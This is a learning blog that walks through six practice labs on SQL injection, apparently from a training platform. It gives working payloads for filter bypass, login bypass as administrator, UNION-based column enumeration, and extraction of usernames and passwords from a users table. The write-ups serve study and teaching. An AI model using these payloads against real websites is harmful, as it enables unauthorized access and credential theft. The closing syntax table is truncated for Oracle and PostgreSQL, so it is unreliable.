This blog documents my daily learning progress through practical SQL Injection labs. The exercises below demonstrate various SQL Injection techniques used to exploit common vulnerabilities in web applications. Each lab includes context, objectives, methods used, and successful payloads.

# Lab 1 - Retrieving Hidden Data via SQL Injection
Lab Description:
This lab contains a SQL injection vulnerability in the product category filter. The SQL query used is:

sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
Objective:
Exploit the SQL injection vulnerability to retrieve unreleased products from the database.

Solution Strategy:
By injecting a comment to bypass the released = 1 condition:

arduino
https://insecure-website.com/products?category=Gifts'--
This modifies the query to:

sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Using a Boolean-based condition:

arduino
https://insecure-website.com/products?category=Gifts'+OR+1=1--
This ensures the query always returns true and displays all products, including unreleased ones.

# Lab 2 - Login Bypass via SQL Injection
Lab Description:
The lab simulates a login form vulnerable to SQL injection.

Objective:
Bypass the authentication mechanism to log in as the administrator.

Exploitation Example:

Injecting in the username field:

vbnet
Username: administrator'--
This changes the SQL query to:

sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
Alternatively, using a Boolean-based payload:

vbnet
Username: administrator  
Password: ' OR 1=1 --

# Lab 3 - Determining the Number of Columns via UNION
Lab Description:
The lab requires using the UNION SQL operator to determine how many columns exist in the original query.

Objective:
Discover the number of columns in the result set to proceed with further UNION-based attacks.

Methods Used:

Using ORDER BY clause to find the column count:

pgsql
' ORDER BY 1--
' ORDER BY 3--
Increase the number until an error is returned.

Using UNION with NULL values:

sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
Gradually increase the number of NULL values until no error is thrown, indicating a match with the number of columns.

# Lab 4 - Finding a Text-Compatible Column
Lab Description:
This lab requires identifying which columns can hold text values to display extracted data.

Objective:
Determine which column can be used to extract and display usernames or passwords.

Steps:

Identify column count:

vbnet
' UNION SELECT NULL,NULL--
Check which column supports text:

sql
' UNION SELECT 'abc',NULL--
' UNION SELECT NULL,'abc'--
Extract data:

bash
' UNION SELECT NULL,username||'*'||password FROM users--

# Lab 5 - Retrieving Data from Other Tables
Lab Description:
This lab focuses on using UNION to retrieve information from unrelated tables in the database.

Objective:
Extract username and password from the users table.

Steps Followed:

Determine the number of columns:

vbnet
' UNION SELECT NULL,NULL--
Verify columns can hold text:

bash
' UNION SELECT 'abc','def'--
Final data extraction payload:

vbnet
' UNION SELECT username, password FROM users--

# Lab 6 - Retrieve Multiple Values in a Single Column
Lab Description:
This lab involves using string concatenation to combine and extract multiple values into one output column.

Objective:
Concatenate username and password and display them in a single result field.

Steps Taken:

Identify the text-compatible column:

bash
' UNION SELECT NULL,'abc'--
Use concatenation to extract data:

bash
' UNION SELECT NULL,username||'~'||password FROM users--
String Concatenation Reference Table:

Database	Concatenation Syntax
Oracle	`'a'
PostgreSQL	`'a'
MySQL	CONCAT('a','b')
SQL Server	'a' + 'b'

Each of these labs provided a strong foundation for understanding SQL injection techniques and how to exploit and mitigate such vulnerabilities in real-world applications.

Stay tuned for more daily progress as I continue exploring the world of web application security.
